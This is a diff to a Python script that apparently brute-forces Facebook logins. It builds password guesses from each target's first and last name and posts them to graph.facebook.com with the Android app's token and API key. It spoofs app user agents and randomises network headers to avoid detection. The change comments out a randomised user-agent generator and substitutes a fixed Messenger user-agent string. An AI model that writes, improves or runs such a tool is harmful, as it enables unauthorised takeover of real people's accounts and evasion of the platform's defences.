@@ -350,6 +350,7 @@ def old():
             uid = star + mal
             heron.submit(login, uid, meth)
 
+user_agent="Dalvik/2.1.0 (Linux; U; Android 8.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/483.0.0.16.537;FBPN/com.facebook.orca;FBLC/en_US;FBBV/346852117;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/8.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920)"
 
 def filee():
     sort.clear()
@@ -435,9 +436,9 @@ def filee():
 
 
 def file_sub(uid, pwx, name, meth, file):
+
     global oks, loop, sys_ua
     Session = requests.session()
-    custom_agent = ""
     if meth in ["a", "A", "1"]:
         uax = ua[0]
     elif meth in ["b", "B", "2"]:
@@ -468,27 +469,27 @@ def file_sub(uid, pwx, name, meth, file):
             ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
                                                                                                           ls).replace(
                 'Name', name).replace('name', name.lower())
-            try:
-                rdp = "FBBV/" + uax.split("FBBV/")[1].split(";")[0]
-                device = uax.split("FBDV/")[1].split(";")[0]
-                plat = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
-                                      "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
-                fban = uax.split("FBAN/")[1].split(";")[0]
-                fbpn = uax.split("FBPN/")[1].split(";")[0]
-                fbav = uax.split("FBAV/")[1].split(";")[0]
-                fbbd = uax.split("FBBD/")[1].split(";")[0]
-                model = dd(fbbd, device)
-                fbverson = str(random.choice(range(150, 300))) + ".0.0." + str(
-                    random.choice(range(17, 50))) + "." + str(random.choice(range(95, 150)))
-                androidv = str(random.choice(range(5, 10))) + "." + str(random.choice(["1", "0"])) + "." + str(
-                    random.choice(["2", "1", "0"]))
-                nowandroidv = uax.split("Android ")[1].split(";")[0]
-                useragent = uax.replace(rdp, 'FBBV/' + str(random.choice(range(100000000, 888999000)))).replace(
-                    nowandroidv, androidv).replace(fban, plat.split('|')[1]).replace(fbpn, plat.split('|')[0]).replace(
-                    fbav, fbverson).replace(device, model)
-            except:
-                useragent = uax
-                model = uax.split("FBDV/")[1].split(";")[0]
+            # try:
+            #     rdp = "FBBV/" + uax.split("FBBV/")[1].split(";")[0]
+            #     device = uax.split("FBDV/")[1].split(";")[0]
+            #     plat = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
+            #                           "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
+            #     fban = uax.split("FBAN/")[1].split(";")[0]
+            #     fbpn = uax.split("FBPN/")[1].split(";")[0]
+            #     fbav = uax.split("FBAV/")[1].split(";")[0]
+            #     fbbd = uax.split("FBBD/")[1].split(";")[0]
+            #     model = dd(fbbd, device)
+            #     fbverson = str(random.choice(range(150, 300))) + ".0.0." + str(
+            #         random.choice(range(17, 50))) + "." + str(random.choice(range(95, 150)))
+            #     androidv = str(random.choice(range(5, 10))) + "." + str(random.choice(["1", "0"])) + "." + str(
+            #         random.choice(["2", "1", "0"]))
+            #     nowandroidv = uax.split("Android ")[1].split(";")[0]
+            #     useragent = uax.replace(rdp, 'FBBV/' + str(random.choice(range(100000000, 888999000)))).replace(
+            #         nowandroidv, androidv).replace(fban, plat.split('|')[1]).replace(fbpn, plat.split('|')[0]).replace(
+            #         fbav, fbverson).replace(device, model)
+            # except:
+            #     useragent = uax
+            #     model = uax.split("FBDV/")[1].split(";")[0]
             token = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             adi = str(uuid.uuid4())
             data = {
@@ -514,7 +515,7 @@ def file_sub(uid, pwx, name, meth, file):
                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                 "api_key": "882a8490361da98702bf97a021ddc14d"}
             head = {
-                'User-Agent': useragent,
+                'User-Agent': user_agent,
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Host': 'graph.facebook.com',
                 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
